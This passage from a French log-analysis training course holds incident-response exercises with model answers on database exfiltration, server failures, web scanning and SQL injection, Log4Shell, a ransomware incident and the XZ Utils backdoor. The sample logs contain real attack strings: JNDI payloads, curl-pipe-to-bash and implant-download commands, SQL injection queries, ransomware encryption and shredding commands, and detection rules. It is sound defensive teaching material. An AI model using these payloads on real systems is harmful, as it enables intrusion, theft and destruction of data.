--- /var/log/mysql/mysql.log ---
2024-01-10T14:25:03.123456Z 8 Query  SHOW DATABASES;
2024-01-10T14:25:07.234567Z 8 Query  USE production_db;
2024-01-10T14:25:09.345678Z 8 Query  SHOW TABLES;
2024-01-10T14:25:15.456789Z 8 Query  SELECT * FROM users LIMIT 5;
2024-01-10T14:25:22.567890Z 8 Query  SELECT username, password_hash, email FROM users;
2024-01-10T14:25:31.678901Z 8 Query  SELECT * FROM credit_cards;
2024-01-10T14:25:45.789012Z 8 Query  SELECT COUNT(*) FROM orders;
2024-01-10T14:26:01.890123Z 8 Query  mysqldump -u root production_db > /tmp/dump_backup.sql

--- /var/log/syslog ---
Jan 10 14:26:15 db-server kernel: [12345.6789] device veth0: renamed from eth0
Jan 10 14:26:33 db-server rsync[10123]: receiving file list ... done
Jan 10 14:26:33 db-server rsync[10123]:          45,234,123 100%   5.23MB/s   0:00:08 dump_backup.sql
Jan 10 14:26:33 db-server rsync[10123]: sent 42 bytes  received 45,276,834 bytes  18,110,750.40 bytes/sec

--- /var/log/auth.log (suite) ---
Jan 10 14:26:45 db-server sshd[9901]: Disconnected from user backup 10.0.1.15 port 44321
```

**Questions :**

```
1. Reconstruire la timeline complète de l'incident (4 minutes)
2. Quel est le vecteur d'attaque initial ?
3. Quelles données ont été exfiltérées ?
4. Vers quelle IP les données ont-elles été envoyées ?
5. Évaluer la gravité (CVSS-like : impact données, confidentialité, intégrité)
6. Quelles règles SIEM aurait pu détecter cet incident en temps réel ?
```

**Réponses :**

```
1. Timeline :
   14:22:01 → Connexion SSH compte "backup" depuis 10.0.1.15
   14:24:55 → Élévation sudo pour accéder à MySQL en root
   14:25:03 → Exploration base de données (reconnaissance)
   14:25:22 → Extraction des credentials utilisateurs (username + hash)
   14:25:31 → Extraction des données cartes bancaires (PCI DSS violation !)
   14:26:01 → Dump complet de la base de données production
   14:26:15 → Modification interface réseau (pour masquer le transfert ?)
   14:26:33 → Exfiltration de 45 MB via rsync
   14:26:45 → Déconnexion propre (couverture des traces)

2. Vecteur initial : clé SSH du compte "backup" compromise
   (le compte backup n'aurait pas dû avoir accès à MySQL root)

3. Données exfiltrées :
   - Table users : usernames + password_hashes + emails
   - Table credit_cards : données bancaires COMPLÈTES
   - Dump SQL complet de production_db (45 MB)
   → VIOLATION RGPD + PCI DSS CRITIQUE

4. Les données partent vers 10.0.1.15 via rsync
   → Analyser d'où vient cette IP dans le LAN
   → C'est peut-être un serveur pivot (attaque en mouvement latéral)

5. Gravité MAXIMALE :
   - Confidentialité : CRITIQUE (données perso + bancaires)
   - Intégrité : HAUTE (accès root MySQL = peut modifier les données)
   - Disponibilité : MODÉRÉE (pas de destruction apparente)

6. Règles SIEM à implémenter :
   - ALERTE : Accès MySQL root depuis un compte non-applicatif
   - ALERTE : SELECT sur tables sensibles (users, credit_cards)
   - ALERTE : mysqldump d'une base de production
   - ALERTE : Transfert rsync > 10MB depuis un serveur DB
   - ALERTE : Modification interface réseau hors maintenance
   - ALERTE : Connexion backup pendant heures ouvrables
```

---

## MODULE 8 — Logs Système et Kernel — Exercices Réels

### 8.1 Comprendre les logs kernel

```
Format d'un message kernel :
Jan 10 09:00:01 server01 kernel: [  123.456789] message
                                  │             │
                                  └─ Uptime en sec └── Message printk

Niveaux dans /var/log/kern.log :
  emerg   → Panic, crash imminent
  alert   → Corruption mémoire grave
  crit    → BUG() appelé, matériel défaillant
  err     → Erreur driver, I/O error
  warning → Dégradation de performance
  notice  → Événement notable (module chargé, interface up)
  info    → Informations générales
  debug   → Débogage (verbose)
```

---

### 🔬 EXERCICE 8.1 — NIVEAU DÉBUTANT : Analyse d'un Crash OOM

**Contexte** : Le serveur est devenu lent puis un processus a été tué.

```
=== LOG À ANALYSER ===

Jan 10 11:34:22 appserver kernel: [345678.901234] node 0 DMA free:1024kB min:68kB low:84kB high:100kB active_anon:0kB
Jan 10 11:34:22 appserver kernel: [345678.912345] lowmem_reserve[]: 0 2831 15832 15832
Jan 10 11:34:22 appserver kernel: [345678.923456] Node 0 DMA32 free:45312kB min:17204kB
Jan 10 11:34:23 appserver kernel: [345679.001234] Out of memory: Kill process 12456 (java) score 892 or sacrifice child
Jan 10 11:34:23 appserver kernel: [345679.012345] Killed process 12456 (java) total-vm:4194304kB, anon-rss:3145728kB
Jan 10 11:34:23 appserver kernel: [345679.023456] oom_reaper: reaped process 12456 (java), now anon-rss:0kB, file-rss:0kB
Jan 10 11:34:25 appserver systemd[1]: tomcat.service: Main process exited, code=killed, status=9/KILL
Jan 10 11:34:25 appserver systemd[1]: tomcat.service: Failed with result 'oom-killed'.
Jan 10 11:34:25 appserver systemd[1]: Failed to start Apache Tomcat Web Server.
```

**Questions :**

```
1. Que signifie "OOM" ? Que s'est-il passé ?
2. Quel processus a été tué ? Quel service impacté ?
3. Que signifie le "score 892" ?
4. Quelle était la mémoire RSS utilisée par le processus tué ?
5. Comment prévenir ce type d'incident ?
```

**Réponses :**

```
1. OOM = Out Of Memory. Le noyau Linux a manqué de RAM et a déclenché
   l'OOM Killer pour libérer de la mémoire en tuant le processus le moins
   "essentiel" mais qui consomme le plus.

2. Processus tué : PID 12456 (java) = application Java/Tomcat
   Service impacté : tomcat.service → serveur web applicatif en panne

3. Le score OOM va de 0 à 1000. Plus le score est élevé, plus le processus
   est susceptible d'être tué. 892 = très gros consommateur de mémoire.
   Calculé sur : taille mémoire, temps d'exécution, enfants, priorité.

4. anon-rss:3145728kB = 3 Go de RAM physique utilisée
   (total-vm:4194304kB = 4 Go de mémoire virtuelle)

5. Prévention :
   - Augmenter la RAM physique ou ajouter du swap
   - Configurer les limites JVM : -Xmx2g pour plafonner Java
   - Utiliser cgroups pour limiter la mémoire par service
   - Configurer /proc/sys/vm/overcommit_memory
   - Monitorer la RAM avec alertes avant saturation (Prometheus/Grafana)
   - echo "-1000" > /proc/[PID]/oom_score_adj pour protéger un processus
```

---

### 🔬 EXERCICE 8.2 — NIVEAU INTERMÉDIAIRE : Erreurs Disque

**Contexte** : Des erreurs apparaissent sur un serveur de production.

```
=== LOG À ANALYSER ===

Jan 10 06:45:12 storage01 kernel: [789012.345678] ata1.00: exception Emask 0x0 SAct 0x7 SErr 0x0 action 0x6 frozen
Jan 10 06:45:12 storage01 kernel: [789012.356789] ata1.00: failed command: READ FPDMA QUEUED
Jan 10 06:45:12 storage01 kernel: [789012.367890] ata1.00: cmd 60/08:00:f0:23:3c/00:00:00:00:00/40 tag 0 ncq dma 4096 in
Jan 10 06:45:12 storage01 kernel: [789012.378901] ata1.00: status: { DRDY ERR }
Jan 10 06:45:12 storage01 kernel: [789012.389012] ata1.00: error: { UNC }
Jan 10 06:45:13 storage01 kernel: [789013.001234] end_request: I/O error, dev sda, sector 7349488
Jan 10 06:45:13 storage01 kernel: [789013.012345] Buffer I/O error on device sda1, logical block 4551280
Jan 10 06:45:14 storage01 kernel: [789014.001234] SCSI error: return code = 0x08000002
Jan 10 06:45:14 storage01 kernel: [789014.012345] end_request: I/O error, dev sda, sector 7349496
Jan 10 06:45:15 storage01 kernel: [789015.001234] EXT4-fs error (device sda1): ext4_find_entry:1455: inode #18723456: comm mysqld: reading directory lblock 0
Jan 10 06:45:15 storage01 kernel: [789015.012345] EXT4-fs error (device sda1): ext4_journal_check_start:56: Detected aborted journal
Jan 10 06:45:15 storage01 kernel: [789015.023456] EXT4-fs (sda1): Remounting filesystem read-only
Jan 10 06:45:16 storage01 mysqld[5678]: InnoDB: Operating system error number 5 in a file operation.
Jan 10 06:45:16 storage01 mysqld[5678]: InnoDB: Error number 5 means 'Input/output error'.
Jan 10 06:45:16 storage01 mysqld[5678]: InnoDB: Cannot continue operation.
Jan 10 06:45:16 storage01 mysqld[5678]: InnoDB: The error means that the operating system refuses all IO for security reasons. Shutting down.
```

**Questions :**

```
1. Quel type d'erreur affecte le système ?
2. Quel est le périphérique concerné ?
3. Que signifie "UNC" dans le contexte ATA ?
4. Quelle est la conséquence sur le filesystem ?
5. Pourquoi MySQL a-t-il crashé ?
6. Quelle est la procédure d'urgence recommandée ?
```

**Réponses :**

```
1. Erreurs d'I/O disque — secteurs défectueux (bad sectors) sur un disque
   physique en cours de défaillance (failure imminente)

2. /dev/sda (sda1) — premier disque SATA, partition 1

3. UNC = Uncorrectable Error — le disque a tenté de lire un secteur
   (sector 7349488) mais n'a pas pu le corriger via ECC.
   C'est un signe de disque mourant.

4. EXT4 a détecté l'erreur et remonté le filesystem en READ-ONLY
   pour protéger les données → "Remounting filesystem read-only"
   Le journal EXT4 est marqué "aborted" → fsck requis au prochain boot

5. MySQL (InnoDB) a besoin d'écrire ses fichiers de données.
   Le filesystem étant en read-only, toutes les écritures échouent
   avec "Input/output error" → MySQL ne peut pas continuer → arrêt forcé

6. Procédure d'urgence :
   IMMÉDIAT :
   - Identifier si RAID disponible : cat /proc/mdstat
   - Snapshot/backup immédiat si données accessibles
   - NE PAS éteindre brutalement (risque de perte de données)
   
   DIAGNOSTIC :
   - sudo smartctl -a /dev/sda (état SMART du disque)
   - sudo dmesg | grep -i "ata\|sda\|error" (tous les messages)
   
   REMPLACEMENT :
   - Remplacer le disque physique
   - Restaurer depuis backup
   - Vérifier les autres disques (SMART préventif)
```

---

## MODULE 9 — Logs Applicatifs — Exercices Réels

### 🔬 EXERCICE 9.1 — NIVEAU INTERMÉDIAIRE : Logs Apache/Nginx

**Contexte** : Analyser des logs de serveur web suspects.

```
=== ACCESS LOG À ANALYSER ===

192.168.1.100 - - [10/Jan/2024:09:00:01 +0100] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 Chrome/120.0"
10.0.0.50 - - [10/Jan/2024:09:00:15 +0100] "GET /index.php HTTP/1.1" 200 5678 "-" "Mozilla/5.0 Firefox/121.0"
185.220.101.45 - - [10/Jan/2024:09:01:33 +0100] "GET /admin HTTP/1.1" 404 456 "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:34 +0100] "GET /admin.php HTTP/1.1" 404 456 "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:35 +0100] "GET /wp-admin HTTP/1.1" 404 456 "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:36 +0100] "GET /phpmyadmin HTTP/1.1" 404 456 "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:37 +0100] "GET /.env HTTP/1.1" 200 89  "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:38 +0100] "GET /backup.sql HTTP/1.1" 200 45678 "-" "Nikto/2.1.6"
185.220.101.45 - - [10/Jan/2024:09:01:39 +0100] "GET /config.php.bak HTTP/1.1" 200 1234 "-" "Nikto/2.1.6"
45.83.64.1 - - [10/Jan/2024:09:15:22 +0100] "POST /search.php HTTP/1.1" 200 890 "-" "sqlmap/1.7"
45.83.64.1 - - [10/Jan/2024:09:15:23 +0100] "GET /search.php?q=1'+OR+'1'='1 HTTP/1.1" 500 1234 "-" "sqlmap/1.7"
45.83.64.1 - - [10/Jan/2024:09:15:24 +0100] "GET /search.php?q=1'+UNION+SELECT+1,2,3-- HTTP/1.1" 200 2345 "-" "sqlmap/1.7"
45.83.64.1 - - [10/Jan/2024:09:15:25 +0100] "GET /search.php?q=1'+UNION+SELECT+username,password,3+FROM+users-- HTTP/1.1" 200 4567 "-" "sqlmap/1.7"
```

**Questions :**

```
1. Identifier les deux attaques distinctes et leurs outils
2. Quelles sont les découvertes critiques de la première attaque ?
3. La seconde attaque a-t-elle réussi ? Indices ?
4. Quelles données ont potentiellement été exfiltrées ?
5. Écrire la règle iptables/fail2ban pour bloquer ces attaques
```

**Réponses :**

```
1. Attaque 1 (185.220.101.45) : Scanner web NIKTO
   - Outil de scan automatisé open-source (reconnaissance)
   Attaque 2 (45.83.64.1) : SQLMAP
   - Outil d'exploitation SQLi automatisé

2. Découvertes critiques de Nikto :
   🔴 /.env → HTTP 200 = FICHIER EXPOSÉ !
     (contient souvent DB_PASSWORD, API_KEY, SECRET_KEY)
   🔴 /backup.sql → HTTP 200 = DUMP SQL TÉLÉCHARGEABLE (45 KB !)
   🔴 /config.php.bak → HTTP 200 = CONFIG PHP EXPOSÉE
   Ces trois 200 sont des CATASTROPHES de sécurité.

3. Oui, probable succès de SQLi :
   - HTTP 500 sur le premier test (erreur SQL = vulnérabilité confirmée)
   - HTTP 200 sur UNION SELECT (requête réussie)
   - Dernière requête extraite users/password = code HTTP 200
   → Les credentials ont probablement été exfiltrés

4. Données potentiellement exfiltrées :
   - Via .env : credentials et clés API
   - Via backup.sql : dump complet de la base (45KB)
   - Via SQLi : table users avec username+password

5. Règles de protection :
   # Bloquer les IPs attaquantes
   iptables -A INPUT -s 185.220.101.45 -j DROP
   iptables -A INPUT -s 45.83.64.1 -j DROP

   # Fail2ban — /etc/fail2ban/filter.d/nikto.conf
   [Definition]
   failregex = <HOST> .* "(GET|POST) .*(\.env|backup\.sql|config\.php\.bak)
   ignoreregex =

   # Fail2ban — /etc/fail2ban/filter.d/sqli.conf
   [Definition]
   failregex = <HOST> .* ".*('|UNION|SELECT|DROP|INSERT|UPDATE|DELETE|OR '1'='1)
   ignoreregex =
```

---

# ═══════════════════════════════════════════════════
# NIVEAU 4 — CYBERSÉCURITÉ ET LOGS D'ATTAQUES
# ═══════════════════════════════════════════════════

---

## MODULE 10 — Reconnaissance des Patterns d'Attaque

### 10.1 Signatures d'attaques dans les logs

```
ATTAQUE               SIGNATURE DANS LES LOGS
─────────────────────────────────────────────────────────────────
Brute Force SSH       → Multiples "Failed password" même IP
                        Intervalle régulier (outil automatisé)
                        Liste d'usernames communs (root, admin...)

Credential Stuffing   → "Failed password" depuis IPs variées
                        Mêmes usernames ciblés
                        Timing aléatoire (contourne fail2ban)

Scan de ports         → UFW BLOCK multiples ports, même source
                        Ports séquentiels (nmap -p-)

Scan web              → 404/403 multiples fichiers sensibles
                        User-Agent Nikto, Nessus, Masscan...
                        Requêtes vers .env, wp-admin, phpmyadmin

SQLi                  → Requêtes avec ', --, UNION, SELECT dans URL
                        HTTP 500 suivi de 200 (tâtonnement)
                        User-Agent sqlmap

XSS                   → <script>, alert(), javascript: dans params
                        Souvent combiné avec SQLi

LFI/RFI               → ../../../etc/passwd dans paramètres URL
                        php://input, file://, http:// dans params

RCE Web Shell         → Requêtes POST vers des fichiers .php anormaux
                        User-agent curl/wget (script automatisé)
                        Commandes encodées en base64 dans les params

Mouvement Latéral     → Connexions SSH internes inter-serveurs
                        Timing : juste après une connexion externe
                        Comptes service utilisés pour SSH

Exfiltration          → Gros transferts sortants (rsync, scp, curl)
                        DNS queries inhabituelles (DNS tunneling)
                        Connexions HTTPS longues durée (C2)

Persistence           → Modification crontab
                        Installation de service systemd
                        Ajout de clé SSH authorized_keys
                        Modification /etc/passwd ou /etc/shadow
```

### 10.2 Outils d'analyse automatisée

```bash
# GoAccess — Analyse temps réel des logs web
$ sudo apt install goaccess
$ goaccess /var/log/nginx/access.log --log-format=COMBINED
$ goaccess /var/log/apache2/access.log -o /var/www/html/report.html --real-time-html

# logwatch — Rapport journalier
$ sudo apt install logwatch
$ sudo logwatch --detail high --service sshd --range today

# Fail2ban — Protection automatique
$ sudo apt install fail2ban
$ sudo fail2ban-client status
$ sudo fail2ban-client status sshd
$ sudo fail2ban-client set sshd unbanip 185.220.101.45

# lnav — Navigateur de logs avancé
$ sudo apt install lnav
$ lnav /var/log/auth.log /var/log/syslog

# Logcheck — Alertes sur anomalies
$ sudo apt install logcheck
```

---

## MODULE 11 — Logs Post-Intrusion Réels (2023-2024)

### 🔬 EXERCICE 11.1 — EXPERT : Attaque Log4Shell (CVE-2021-44228) — Variante 2024

**Contexte** : Log4Shell reste exploitée en 2024 sur des systèmes non patchés. Analysez cette séquence d'attaque réelle.

```
=== LOGS MULTI-SOURCES À ANALYSER ===

--- /var/log/nginx/access.log ---
2024-01-10T10:15:33.123Z 91.92.251.103 "GET /api/v1/users HTTP/1.1" 200 1234 "-" "${jndi:ldap://91.92.251.103:1389/exploit}"
2024-01-10T10:15:33.456Z 91.92.251.103 "GET /api/v1/users HTTP/1.1" 200 1234 "-" "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://91.92.251.103:1389/a}"
2024-01-10T10:15:34.789Z 91.92.251.103 "GET /api/v1/users HTTP/1.1" 200 1234 "X-Api-Version: ${jndi:ldap://91.92.251.103:1389/exploit}" "curl/7.88"

--- /var/log/syslog ---
Jan 10 10:15:35 javaapp kernel: [123456.001] audit: type=1400 audit(...): apparmor="ALLOWED" operation="exec" profile="java" name="/usr/bin/curl"
Jan 10 10:15:36 javaapp java[8901]: Downloading: http://91.92.251.103:8080/payload.class
Jan 10 10:15:36 javaapp java[8901]: java.rmi.ServerException: RemoteException occurred in server thread
Jan 10 10:15:37 javaapp java[8901]: Process[curl http://91.92.251.103:8080/stage2.sh -o /tmp/.update -s] started

--- /var/log/auth.log ---
Jan 10 10:15:40 javaapp sudo[9012]: www-data : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c 'curl http://91.92.251.103:8080/stage2.sh|bash'
Jan 10 10:15:41 javaapp useradd[9034]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash
Jan 10 10:15:42 javaapp passwd[9045]: password changed for sysupdate
Jan 10 10:15:43 javaapp sshd[9056]: Accepted password for sysupdate from 91.92.251.103 port 55678 ssh2

--- /var/log/dpkg.log ---
2024-01-10 10:15:50 install ncat:amd64 <none> 7.80+dfsg1-2
2024-01-10 10:15:52 install masscan:amd64 <none> 2:1.3.2+ds1-1
2024-01-10 10:15:55 install sshpass:amd64 <none> 1.09-1

--- /var/log/syslog (suite) ---
Jan 10 10:16:01 javaapp crontab[9123]: (root) BEGIN EDIT (root)
Jan 10 10:16:02 javaapp crontab[9124]: (root) END EDIT (root)
Jan 10 10:16:10 javaapp systemd[1]: Created slice system-updater.slice
Jan 10 10:16:11 javaapp systemd[1]: Started System Update Service.
```

**Questions :**

```
1. Identifier la CVE exploitée et expliquer le mécanisme
2. Pourquoi y a-t-il plusieurs variantes de la requête (lignes 1-3) ?
3. Décrire chaque étape de la kill chain (ATT&CK Framework)
4. Quels IoC (Indicators of Compromise) sont présents ?
5. Quelle est l'objectif final de l'attaquant (persistance) ?
6. Comment détecter cela avec des règles SIEM en temps réel ?
```

**Réponses :**

```
1. CVE-2021-44228 — Log4Shell
   Mécanisme : Log4j2 traite les messages loggés et évalue les
   expressions de type ${...}. L'expression ${jndi:ldap://...} force
   Log4j à effectuer une requête LDAP/RMI vers le serveur de l'attaquant,
   qui renvoie un objet Java malveillant exécuté dans la JVM de la victime.
   → Remote Code Execution (RCE) sans authentification

2. Variantes = contournement des WAF/IDS :
   Ligne 1 : payload direct dans User-Agent (classique)
   Ligne 2 : obfuscation avec ${lower:j} = j → contourne regex simples
   Ligne 3 : payload dans header X-Api-Version → vecteur moins surveillé
   Les WAF basiques bloquent "jndi:ldap" mais pas les variantes obfusquées

3. Kill Chain (MITRE ATT&CK) :
   T1190 - Initial Access     : Exploitation Log4Shell via User-Agent
   T1059 - Execution          : RCE → téléchargement payload.class Java
   T1105 - Ingress Transfer   : curl stage2.sh depuis serveur C2
   T1548 - Privilege Escalation: sudo www-data → root (misconfiguration)
   T1136 - Account Creation   : useradd sysupdate (UID=0 = root clone !)
   T1098 - Account Manipulation: mot de passe SSH défini pour sysupdate
   T1078 - Valid Accounts     : Connexion SSH avec le nouveau compte
   T1053 - Scheduled Task     : Modification crontab root
   T1543 - Create Service     : Service systemd "System Update" (camouflé)
   T1588 - Tool Download      : ncat, masscan, sshpass (mouvement latéral)

4. IoC (Indicators of Compromise) :
   IPs : 91.92.251.103 (C2)
   Patterns : ${jndi:ldap://...} dans logs HTTP
   Fichiers : /tmp/.update (point commençant par . = caché)
              payload.class, stage2.sh
   User : sysupdate (UID=0 — CRITIQUE !)
   Services : system-updater.slice (nom légitime en apparence)
   Packages : ncat, masscan, sshpass (outils de pivot)

5. Persistance multi-couches :
   → Compte backdoor (sysupdate, UID=0) avec SSH activé
   → Crontab root modifié (probablement reverse shell periodique)
   → Service systemd "System Update" (démarre au boot)
   → Outils installés pour mouvement latéral (masscan = scan réseau interne)

6. Règles SIEM :
   # Détection Log4Shell
   ALERT: HTTP request contains "${jndi:" OR "${${lower:" in User-Agent/headers
   
   # Détection création de compte UID=0
   ALERT: useradd with UID=0 (root clone)
   
   # Détection nouveau service systemd inconnu
   ALERT: systemd "Created slice" + "Started" pour service non whitelisté
   
   # Détection installation outils offensifs
   ALERT: dpkg install of (ncat|nmap|masscan|hydra|sshpass|netcat)
   
   # Corrélation clé : RCE → sudo → useradd dans fenêtre de 30 secondes
   ALERT: www-data executes sudo THEN useradd within 60s
```

---

### 🔬 EXERCICE 11.2 — EXPERT : Ransomware Linux (Style LockBit 3.0)

**Contexte** : Analyser les logs d'un incident ransomware sur serveur Linux.

```
=== LOGS À ANALYSER ===

--- /var/log/auth.log ---
Jan 10 22:01:15 fileserver sshd[15234]: Accepted password for backup from 172.16.0.200 port 45123 ssh2
Jan 10 22:01:16 fileserver sshd[15234]: pam_unix(sshd:session): session opened for user backup

--- /var/log/syslog ---
Jan 10 22:01:30 fileserver bash[15289]: (root) Disabling logging: systemctl stop rsyslog auditd
Jan 10 22:01:31 fileserver systemd[1]: Stopping System Logging Service...
Jan 10 22:01:31 fileserver systemd[1]: rsyslog.service: Deactivated successfully.
Jan 10 22:01:35 fileserver bash[15301]: chmod -x /usr/bin/snap /usr/bin/apt /usr/bin/dpkg
Jan 10 22:01:40 fileserver bash[15312]: vssadmin Delete Shadows /All /Quiet
Jan 10 22:01:45 fileserver bash[15323]: find / -name "*.db" -o -name "*.sql" -o -name "*.mdf" -o -name "*.bak" -type f > /tmp/.targets
Jan 10 22:02:15 fileserver bash[15401]: openssl enc -aes-256-cbc -salt -in /data/clients.db -out /data/clients.db.locked -k [REDACTED]
Jan 10 22:02:18 fileserver bash[15402]: openssl enc -aes-256-cbc -salt -in /data/backups.sql -out /data/backups.sql.locked -k [REDACTED]
Jan 10 22:02:45 fileserver bash[15450]: shred -vfz -n 3 /data/clients.db
Jan 10 22:02:46 fileserver bash[15451]: shred -vfz -n 3 /data/backups.sql
Jan 10 22:05:33 fileserver bash[15678]: curl -X POST https://91.92.251.103:443/report -d '{"host":"fileserver","files":234,"key":"[REDACTED]"}'
Jan 10 22:05:40 fileserver bash[15690]: cat > /data/README_DECRYPT.txt << EOF
Jan 10 22:05:41 fileserver bash[15690]: Your files have been encrypted. Contact: [redacted]@onion.ly
Jan 10 22:06:00 fileserver systemd[1]: System is powering down.

--- /var/log/kern.log ---
Jan 10 22:02:15 fileserver kernel: [456789.001234] EXT4-fs warning (device sda1): ext4_end_bio:330: I/O error 10 writing to inode 234567
Jan 10 22:02:16 fileserver kernel: [456789.012345] EXT4-fs warning (device sda1): ext4_end_bio:330: I/O error 10 writing to inode 234568
Jan 10 22:05:00 fileserver kernel: [456790.001234] sd 0:0:0:0: [sda] Synchronizing SCSI cache
```

**Questions :**

```
1. Reconstituer la kill chain complète du ransomware
2. Pourquoi l'attaquant a-t-il arrêté rsyslog en premier ?
3. Que fait "chmod -x /usr/bin/apt" ? Quel objectif ?
4. Que font exactement les commandes openssl + shred ?
5. Que signifie la requête curl POST vers le C2 ?
6. Comment l'investigation est-elle compliquée par cet incident ?
7. Quelles mesures auraient pu prévenir ou limiter les dégâts ?
```

**Réponses :**

```
1. Kill Chain Ransomware :
   22:01:15 → Accès initial via SSH (compte backup compromis)
   22:01:30 → ANTI-FORENSIQUE : arrêt rsyslog + auditd (stopper les logs !)
   22:01:35 → Désactivation apt/snap/dpkg (empêcher désinstallation outils)
   22:01:40 → Suppression des snapshots (commande Windows sur Linux !)
   22:01:45 → Reconnaissance : liste tous les fichiers DB, SQL, BAK
   22:02:15 → Chiffrement AES-256-CBC des fichiers identifiés
   22:02:45 → Destruction sécurisée des originaux (shred = irrécupérable)
   22:05:33 → Rapport au C2 : confirmation + clé de déchiffrement
   22:05:40 → Dépôt note de rançon
   22:06:00 → Extinction du serveur

2. Arrêt rsyslog en PREMIER = anti-forensique primaire
   → Empêcher l'enregistrement des actions malveillantes
   → Compliquer l'investigation post-incident
   → Masquer la liste des fichiers chiffrés
   NOTE : journald continue à logger (en mémoire) même sans rsyslog
   → C'est pourquoi nous avons quand même des traces !

3. chmod -x /usr/bin/apt = rendre apt non-exécutable
   Objectif : empêcher la victime de :
   - Installer des outils de récupération
   - Installer un antivirus/EDR
   - Patcher le système pendant l'attaque
   - Accès /usr/bin/snap et /usr/bin/dpkg = même logique

4. openssl enc -aes-256-cbc = chiffrement symétrique AES-256
   → Chiffre le fichier original → crée .locked
   → La clé (-k) est générée aléatoirement et envoyée au C2
   
   shred -vfz -n 3 = destruction sécurisée (3 passes)
   → Écrase le fichier 3x avec données aléatoires + 1x avec zéros
   → Rend la récupération forensique IMPOSSIBLE (vs rm simple)
   → Combined : chiffrement + destruction = pas de récupération locale

5. Requête curl POST = "callback" vers le C2 :
   - Signale que le chiffrement est terminé
   - Envoie la clé de déchiffrement (sans elle, les fichiers = irrécupérables)
   - Rapport : nom d'hôte + nombre de fichiers chiffrés (234)
   → Le C2 stocke la clé → utilisée comme levier de pression (rançon)

6. Complications forensiques :
   - rsyslog arrêté → journaux partiels, certaines actions non loggées
   - shred → fichiers originaux irrécupérables (pas de "undelete")
   - Clé AES envoyée au C2 → déchiffrement impossible sans payer
   - Serveur éteint → artefacts volatiles perdus (mémoire RAM, connexions)
   - Les logs qu'on analyse proviennent du JOURNAL systemd (plus difficile à arrêter)

7. Prévention et limitation :
   PRÉVENTION :
   - MFA sur SSH (pas de mot de passe seul)
   - Compte "backup" sans shell SSH
   - Segmentation réseau (ce serveur accessible seulement depuis backup server)
   
   LIMITATION DES DÉGÂTS :
   - Backups hors-ligne (air-gapped) : 3-2-1 rule
   - Immutabilité des backups (chattr +i ou S3 Object Lock)
   - Monitoring intégrité fichiers (AIDE, Wazuh)
   - EDR Linux (Wazuh, CrowdStrike Falcon) — détecte shred + openssl massif
   - SIEM : alerte sur arrêt rsyslog/auditd par processus non-systemd
```

---

### 🔬 EXERCICE 11.3 — EXPERT : Supply Chain Attack (Style SolarWinds/XZ Utils)

**Contexte** : Analyser des logs d'une attaque supply chain sur un serveur de build.

```
=== LOGS MULTI-SOURCES ===

--- /var/log/dpkg.log ---
2024-01-10 08:00:12 upgrade xz-utils:amd64 5.4.1-0.2 5.6.0-0.2ubuntu1
2024-01-10 08:00:15 upgrade liblzma5:amd64 5.4.1-0.2 5.6.0-0.2ubuntu1

--- /var/log/auth.log ---
Jan 10 08:30:22 buildserver sshd[22345]: Accepted publickey for ci-runner from 10.0.1.50 port 45678 ssh2
Jan 10 08:30:55 buildserver sudo[22389]: ci-runner : TTY=pts/0 ; PWD=/opt/builds ; USER=root ; COMMAND=/usr/bin/make install
Jan 10 08:31:10 buildserver sshd[22345]: pam_unix(sshd:session): session opened for user ci-runner

--- /var/log/syslog ---
Jan 10 08:31:15 buildserver sshd[22401]: [process22401] N_RSA_public_decrypt called with altered key
Jan 10 08:31:15 buildserver systemd[1]: sshd.service: A dependency job for sshd.service failed
Jan 10 08:31:20 buildserver bash[22410]: ldd /usr/sbin/sshd | grep liblzma
Jan 10 08:31:20 buildserver bash[22410]:     liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007f1234567890)
Jan 10 08:31:25 buildserver bash[22415]: strings /lib/x86_64-linux-gnu/liblzma.so.5.6.0 | grep -c "HIDDEN_PAYLOAD"
Jan 10 08:31:25 buildserver bash[22415]: → 1
Jan 10 08:31:30 buildserver bash[22420]: objdump -d /lib/x86_64-linux-gnu/liblzma.so.5.6.0 | grep -A5 "RSA_public_decrypt"

--- /var/log/audit/audit.log ---
type=SYSCALL msg=audit(1704873090.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=55abc a1=55def a2=55012 a3=0 items=2 ppid=22401 pid=22501 uid=0 gid=0 euid=0 egid=0 suid=0 sgid=0 fsuid=0 fsgid=0 tty=pts/0 ses=89 comm="sshd" exe="/usr/sbin/sshd" key="exec_root"
type=EXECVE msg=audit(1704873090.456:457): argc=3 a0="sh" a1="-c" a2=6375726c202d73202d6f202f746d702f2e73797375706461746520687474703a2f2f39312e39322e3235312e3130333a383038302f696d706c616e74
```

**Questions :**

```
1. Identifier la CVE réelle exploitée dans cet exercice
2. Quel est le mécanisme d'injection dans la liblzma/sshd ?
3. Décoder le payload hexadécimal dans audit.log
4. Quelle est la fréquence temporelle critique de cette attaque ?
5. Comment détecter une backdoor dans une bibliothèque système ?
6. Quelles vérifications d'intégrité auraient détecté l'intrusion ?
```

**Réponses :**

```
1. CVE-2024-3094 — Backdoor XZ Utils (mars 2024)
   CVSS 10.0 — Score maximum
   Attaque supply chain : code malveillant injecté dans xz-utils 5.6.0/5.6.1
   via un compte maintainer "JiaT75" infiltré sur plusieurs années.
   liblzma.so utilisée par sshd via systemd-notify → backdoor dans sshd !

2. Mécanisme d'injection :
   xz 5.6.0 inclut un script de build malveillant caché dans les tests
   → Ce script modifie liblzma.so lors de la compilation
   → liblzma.so est chargée par sshd (via libsystemd)
   → La backdoor intercepte RSA_public_decrypt dans sshd
   → L'attaquant avec la clé privée correcte peut exécuter des commandes
      SANS s'authentifier (contournement total de sshd)

3. Décodage du payload hex :
   6375726c202d73202d6f202f746d702f2e73797375706461746520
   687474703a2f2f39312e39322e3235312e3130333a383038302f696d706c616e74
   
   → Décodage ASCII :
   curl -s -o /tmp/.sysupdate http://91.92.251.103:8080/implant
   
   La backdoor exécute silencieusement un téléchargement d'implant !
